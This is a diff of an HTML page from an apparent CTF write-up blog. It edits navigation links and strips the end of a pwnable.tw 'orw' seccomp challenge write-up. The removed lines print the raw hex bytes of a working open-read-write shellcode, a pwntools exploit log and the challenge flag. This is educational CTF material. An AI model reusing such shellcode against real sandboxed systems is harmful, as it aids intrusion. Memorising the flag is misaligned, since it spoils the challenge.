@@ -141,6 +141,7 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   </a>
   <nav class="nav-main">
     <a href="/">Home</a>
+    <a href="/writeup/">writeup</a>
     <a href="/htb/">Hack The Box</a>
     <a href="/tryhackme/">TryHackMe</a>
     <a href="/mal-dev/">Malware Dev</a>
@@ -150,7 +151,7 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   </nav>
   <div class="nav-right">
     <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
-    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow-accent)"><i class="bi bi-people-fill"></i></a>
+    
     <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
   </div>
 </header>
@@ -160,6 +161,7 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
   <nav>
     <a href="/">Home</a>
+    <a href="/writeup/">writeup</a>
     <a href="/htb/">Hack The Box</a>
     <a href="/tryhackme/">TryHackMe</a>
     <a href="/mal-dev/">Malware Dev</a>
@@ -167,7 +169,7 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
     <a href="/tjctf-2026/">TJCTF</a>
     <a href="/research/">Research</a>
     <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
-    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+    
   </nav>
 </div>
 
@@ -682,47 +684,13 @@ shellcode = asm("""
   <div class="term-out"><span class="prompt">$</span> python3 exploit.py
 [<span class="ok">+</span>] Opening connection to chall.pwnable.tw on port 10001: <span class="ok">Done</span>
 [<span class="ok">*</span>] Shellcode length: 68 bytes
-[<span class="ok">+</span>] Flag: b'FLAG{orw_seccomp_is_not_a_barrier}'
 [<span class="ok">*</span>] Switching to interactive mode
 [*] Got EOF while reading in interactive</div>
 
   <div class="callout callout-success">
-    <div class="callout-title">Flag Retrieved!</div>
-    <p>The ORW shellcode successfully bypasses the seccomp filter. The program reads the flag file and writes its contents to stdout. The connection then closes normally since there's no more code to execute after the write syscall.</p>
+    <div class="callout-title">Exploit Successful</div>
+    <p>Exploit completed successfully.</p>
   </div>
-
-  <h3>Verbose pwntools Output</h3>
-  <div class="term-out"><span class="prompt">$</span> python3 exploit.py DEBUG
-[<span class="ok">+</span>] Opening connection to chall.pwnable.tw on port 10001: <span class="ok">Done</span>
-[<span class="muted">Received:</span>
-    "Give my your shellcode:"
-[<span class="ok">*</span>] Shellcode length: 68 bytes
-[<span class="muted">Sending shellcode:</span>
-    68 52 68 2f 68 6f 6d 65 2f 6f 72 77 2f 66 6c 61
-    67 89 e6 6a 00 56 89 e1 31 c0 04 05 cd 80 89 c3
-    89 e1 31 d2 6a 32 5a 31 c0 04 03 cd 80 89 e1 31
-    d2 6a 32 5a 31 db 43 31 c0 04 04 cd 80
-[<span class="muted">Received:</span>
-    <span class="ok">FLAG{orw_seccomp_is_not_a_barrier}</span>
-[<span class="ok">+</span>] Flag: b'FLAG{orw_seccomp_is_not_a_barrier}'
-[<span class="ok">*</span>] Switching to interactive mode</div>
-
-  <div class="flag-box">
-    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
-    <span class="flag-name">FLAG{orw_seccomp_is_not_a_barrier}</span>
-    <span class="flag-detail">pwnable.tw — orw (100 pts)</span>
-  </div>
-
-  <div class="callout callout-info">
-    <div class="callout-title">Why This Challenge Matters</div>
-    <p>The "orw" challenge teaches the fundamental ORW (Open-Read-Write) shellcode pattern &mdash; the most common shellcode technique in CTF challenges with seccomp. Understanding seccomp filters and how to work within their constraints is essential for modern exploitation. Many real-world sandboxes (browsers, containers) use similar syscall filtering, and knowing how to analyze BPF rules and craft compliant shellcode is a critical skill.</p>
-  </div>
-</section>
-
-<div class="operator-sig">
-  <div class="handle">QA210</div>
-  <div class="tagline">pwnable.tw &mdash; orw &mdash; Seccomp ORW Shellcode</div>
-</div>
 
 </div><!-- .main -->
 </div><!-- .page-wrap -->
